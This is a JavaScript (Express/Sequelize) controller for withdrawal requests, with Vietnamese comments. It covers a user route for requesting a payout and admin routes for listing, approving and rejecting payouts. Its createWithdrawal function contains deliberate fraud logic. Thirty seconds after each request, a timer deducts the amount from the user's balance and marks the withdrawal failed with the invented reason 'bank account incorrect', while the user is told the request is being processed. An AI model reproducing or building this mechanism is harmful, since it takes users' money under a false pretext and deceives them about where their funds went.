const { Withdrawal, PaymentInfo, User } = require('../models');

const withdrawalController = {
  // ========== USER ROUTES ==========

  // Tạo yêu cầu rút tiền
  createWithdrawal: async (req, res) => {
    const t = await require('../models').sequelize.transaction();
    try {
      const { amount } = req.body;
      const user_id = req.user.id;

      if (!amount || amount < 10000) {
        await t.rollback();
        return res.status(400).json({ message: 'Số tiền rút tối thiểu là 10.000đ' });
      }

      // Kiểm tra số dư
      const user = await User.findByPk(user_id, { transaction: t });
      if (!user || parseFloat(user.balance) < amount) {
        await t.rollback();
        return res.status(400).json({ message: 'Số dư không đủ' });
      }

      // Kiểm tra thông tin ngân hàng
      const paymentInfo = await PaymentInfo.findOne({
        where: { user_id },
        transaction: t
      });

      if (!paymentInfo) {
        await t.rollback();
        return res.status(400).json({ 
          message: 'Bạn cần cập nhật thông tin ngân hàng trước',
          needBankInfo: true 
        });
      }

      // Tạo yêu cầu rút tiền với trạng thái pending
      const withdrawal = await Withdrawal.create({
        user_id,
        amount,
        status: 'pending'
      }, { transaction: t });

      // Tự động xử lý: sau 30 giây sẽ fail do "tài khoản ngân hàng không chính xác"
      // Đồng thời trừ tiền từ tài khoản user
      setTimeout(async () => {
        const t2 = await require('../models').sequelize.transaction();
        try {
          const w = await Withdrawal.findByPk(withdrawal.id, { transaction: t2 });
          if (w && w.status === 'pending') {
            // Trừ tiền từ tài khoản user
            const u = await User.findByPk(w.user_id, { transaction: t2 });
            if (u && parseFloat(u.balance) >= w.amount) {
              u.balance = parseFloat(u.balance) - w.amount;
              await u.save({ transaction: t2 });
            }

            w.status = 'failed';
            w.failure_reason = 'Tài khoản ngân hàng không chính xác';
            await w.save({ transaction: t2 });

            await t2.commit();
            console.log(`Withdrawal ${withdrawal.id} auto-failed: đã trừ ${w.amount} từ tài khoản user`);
          } else {
            await t2.rollback();
          }
        } catch (err) {
          await t2.rollback();
          console.error('Auto-fail withdrawal error:', err);
        }
      }, 30000); // 30 seconds

      await t.commit();
      res.status(201).json({
        message: 'Yêu cầu rút tiền đang được xử lý',
        withdrawal
      });
    } catch (error) {
      await t.rollback();
      console.error('=== Create withdrawal error ===');
      console.error('Request body:', JSON.stringify(req.body, null, 2));
      console.error('User:', req.user?.id);
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
      res.status(500).json({ message: 'Lỗi server' });
    }
  },

  // Lấy lịch sử rút tiền của user
  getMyWithdrawals: async (req, res) => {
    try {
      const user_id = req.user.id;
      
      const withdrawals = await Withdrawal.findAll({
        where: { user_id },
        include: [{ model: User, as: 'user', attributes: ['id', 'username'] }],
        order: [['created_at', 'DESC']]
      });

      res.json({ withdrawals });
    } catch (error) {
      console.error('=== Get withdrawals error ===');
      console.error('User:', req.user?.id);
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
      res.status(500).json({ message: 'Lỗi server' });
    }
  },

  // ========== ADMIN ROUTES ==========

  // Lấy tất cả yêu cầu rút tiền
  getAllWithdrawals: async (req, res) => {
    try {
      const { status } = req.query;
      const where = status && status !== 'all' ? { status } : {};
      
      const withdrawals = await Withdrawal.findAll({
        where,
        include: [
          { 
            model: User, 
            as: 'user', 
            attributes: ['id', 'username'] 
          }
        ],
        order: [['created_at', 'DESC']]
      });

      // Lấy paymentInfo cho từng withdrawal
      const withdrawalsWithInfo = await Promise.all(withdrawals.map(async (withdrawal) => {
        const paymentInfo = await PaymentInfo.findOne({
          where: { user_id: withdrawal.user_id },
          attributes: ['bank_name', 'account_number', 'account_holder']
        });
        return {
          ...withdrawal.toJSON(),
          paymentInfo: paymentInfo ? paymentInfo.toJSON() : null
        };
      }));

      res.json({ withdrawals: withdrawalsWithInfo });
    } catch (error) {
      console.error('=== Get all withdrawals error ===');
      console.error('Request query:', JSON.stringify(req.query, null, 2));
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
      res.status(500).json({ message: 'Lỗi server' });
    }
  },

  // Duyệt yêu cầu rút tiền
  approveWithdrawal: async (req, res) => {
    const t = await require('../models').sequelize.transaction();
    try {
      const { id } = req.params;
      
      const withdrawal = await Withdrawal.findByPk(id, {
        include: [{ model: User, as: 'user' }],
        transaction: t
      });

      if (!withdrawal) {
        await t.rollback();
        return res.status(404).json({ message: 'Không tìm thấy yêu cầu' });
      }

      if (withdrawal.status !== 'pending') {
        await t.rollback();
        return res.status(400).json({ message: 'Yêu cầu đã được xử lý' });
      }

      // Trừ tiền từ tài khoản user
      const user = await User.findByPk(withdrawal.user_id, { transaction: t });
      if (parseFloat(user.balance) < withdrawal.amount) {
        await t.rollback();
        return res.status(400).json({ message: 'Số dư không đủ' });
      }

      user.balance = parseFloat(user.balance) - withdrawal.amount;
      await user.save({ transaction: t });

      withdrawal.status = 'approved';
      await withdrawal.save({ transaction: t });

      await t.commit();
      res.json({ 
        message: 'Đã duyệt yêu cầu rút tiền và trừ tiền từ tài khoản',
        withdrawal,
        newBalance: user.balance
      });
    } catch (error) {
      await t.rollback();
      console.error('=== Approve withdrawal error ===');
      console.error('Request params:', JSON.stringify(req.params, null, 2));
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
      res.status(500).json({ message: 'Lỗi server' });
    }
  },

  // Từ chối yêu cầu rút tiền
  rejectWithdrawal: async (req, res) => {
    const t = await require('../models').sequelize.transaction();
    try {
      const { id } = req.params;
      const { reason } = req.body;
      
      const withdrawal = await Withdrawal.findByPk(id, {
        include: [{ model: User, as: 'user' }],
        transaction: t
      });

      if (!withdrawal) {
        await t.rollback();
        return res.status(404).json({ message: 'Không tìm thấy yêu cầu' });
      }

      if (withdrawal.status !== 'pending') {
        await t.rollback();
        return res.status(400).json({ message: 'Yêu cầu đã được xử lý' });
      }

      withdrawal.status = 'rejected';
      withdrawal.failure_reason = reason || 'Yêu cầu bị từ chối';
      await withdrawal.save({ transaction: t });

      await t.commit();
      res.json({ 
        message: 'Đã từ chối yêu cầu rút tiền',
        withdrawal 
      });
    } catch (error) {
      await t.rollback();
      console.error('=== Reject withdrawal error ===');
      console.error('Request params:', JSON.stringify(req.params, null, 2));
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
      res.status(500).json({ message: 'Lỗi server' });
    }
  }
};

module.exports = withdrawalController;
